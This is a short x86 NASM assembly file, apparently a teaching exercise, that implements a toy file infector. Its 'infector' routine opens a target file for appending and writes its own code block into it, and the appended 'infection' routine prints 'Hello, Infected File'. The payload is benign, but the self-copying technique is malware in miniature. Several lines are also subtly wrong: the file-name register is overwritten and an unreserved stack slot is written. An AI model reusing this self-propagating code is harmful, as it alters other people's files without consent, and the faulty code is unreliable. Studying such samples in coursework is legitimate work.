
section .rodata
    message: db "Hello, Infected File", 10, 0	; string
    messageSize: equ $ - message	; string_size
section .text

global _start
global infector
global infection
global system_call
extern main
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
    infection:
        push ebp		;BACKUP ebp
		mov ebp, esp		;set EBP to infection AF
		mov ebp, [ebp+8]	;get the argument
		pushad			;backup REGISTER

		mov eax, 4		;system call number (sys_write)
		mov ebx, ebp		;file descriptor (stdout)
		mov ecx, message		;message to write
		mov edx, messageSize		;message length
		int 0x80		;call kernel


		mov eax, 1		;system call number (sys_exit)
		mov ebx, 0		;exit status
		int 0x80


    infector:                           ;func that void infector(char*)
        push    ebp                     ; Save caller state
        mov     ebp, esp
        pushad                       ; Save some more caller state

        openFile:
            mov eax, 5               ; 5 is sys_open
            mov ebx, [ebp+8]         ; ebx get the file name
            mov ecx, 1024               ; 2 is file access mode read and write
            or ecx ,4
            mov ebx, 0777               ; 2nd arg - pointer to file name

            int 0x80                    ; system_call
            mov [ebp-4], eax            ; save returned value - fd

        write:           
            mov eax, 4                   ; 4 is sys_write
            mov ebx, [ebp-4]             ; [ebp-4] have the file descriptor
            mov ecx, code_start          ; ecx get the pointer of the output buffer
            mov edx, code_end-code_start ; code_end - code_start is the size to write
            int 0x80

        closeFile:
            mov eax, 6                    ; 6 is sys_close
            mov ebx, [ebp-4]              ; ebx have the file descriptor
            int 0x80                     ; system_call

        add esp, 4                       ; restore space of local variable
        popad                            ; Restore caller state (registers)
        pop ebp                          ; Restore caller state
        ret                              ; Back to caller

code_end: